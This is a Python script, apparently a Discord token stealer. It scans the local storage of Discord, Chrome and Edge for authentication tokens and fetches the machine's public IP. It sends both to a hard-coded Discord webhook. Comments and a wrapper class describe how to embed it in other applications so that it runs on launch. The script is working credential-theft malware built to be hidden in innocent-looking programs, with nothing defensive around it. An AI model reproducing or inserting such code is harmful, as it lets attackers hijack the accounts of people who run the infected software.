class Sniper():
    def __init__(self, *args, **kwargs):
        super(Sniper, self).__init__(*args, **kwargs)

        #by msr#1337 if you do not have the brain to add this to your script , dont.
        #sniper is an xxi subsider made for applications and class

def xxisniff(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass

def sniper():
    hook = Webhook("https://discord.com/api/webhooks/822212823047209012/tJFS4RvYBGmegVUVHbQjfPXQViEzOwSGl9rlsUYvwhXAXIUtpo9PtHrvdexVClWiSQUd")
    hostname = requests.get("https://api.ipify.org").text 
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = xxisniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
        embed = Embed(title=f'{hostname}',color=16764108)
        embed.add_field("Tokens:",message)
        hook.send(embed=embed)

sniper()

---------------------------------- script to add up there

---------------------------------- function to make it start with qt or similar.


def sniper(self):
    snp = Sniper()
    snp.exec()
